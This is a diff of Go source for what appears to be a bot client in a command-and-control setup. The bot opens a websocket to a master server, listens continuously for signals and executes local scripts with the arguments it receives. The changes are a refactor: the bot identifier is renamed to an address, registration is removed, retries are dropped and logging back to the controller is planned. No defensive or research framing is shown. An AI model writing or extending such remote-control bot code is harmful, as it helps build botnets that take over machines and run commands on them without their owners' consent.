@@ -16,33 +16,31 @@ type Message struct {
 }
 
 type Bot struct {
-	ID     string
+	Addr   string
 	Master string
 	Conn   *websocket.Conn
 }
 
-func NewBot(id, master string) *Bot {
-	return &Bot{ID: id, Master: master}
+func NewBot(addr, master string) *Bot {
+	return &Bot{Addr: addr, Master: master}
 }
 
 // Attempts to establish a WS connection with the C2 layer
 func (b *Bot) Connect() error {
-	conn, _, err := websocket.DefaultDialer.Dial(b.Master, nil)
+	conn, _, err := websocket.DefaultDialer.Dial(b.Master, nil) // For simplicity: C2 treats this as registration
 	if err != nil {
-		return err // TODO: @Azime Benzema [Retry connection after timeout]
+		return err // Let's skip retrying connections
 	}
 
 	b.Conn = conn
 	return nil
 }
 
-// Sends a Registration signal to the C2 Layer
-func (b *Bot) Register() error {
-	return b.Conn.WriteJSON(Message{Payload: "R", From: b.ID})
-}
-
 // Handler function to execute local scripts depending on received signal from C2 layer
 func (b *Bot) Execute(fname string, args string) error {
+
+	// TODO: Also send log messages back to C2
+
 	args = strings.TrimSpace(args)
 	if args == "" {
 		return fmt.Errorf("[×] Failed to execute %s: No args received!\n", fname)
@@ -60,7 +58,7 @@ func (b *Bot) Execute(fname string, args string) error {
 // Websocket Loop that continuously listens to signals from the C2 layer, staying active
 func (b *Bot) Listen() error {
 	defer b.Conn.Close()
-	log.Printf("[+] Connected to C2 as %s", b.ID)
+	log.Printf("[+] Connected to C2 as %s", b.Addr)
 
 	for {
 		_, data, err := b.Conn.ReadMessage()
@@ -82,11 +80,6 @@ func (b *Bot) Listen() error {
 
 func (b *Bot) Run() error {
 	if err := b.Connect(); err != nil {
-		return err
-	}
-
-	if err := b.Register(); err != nil {
-		b.Conn.Close()
 		return err
 	}
 
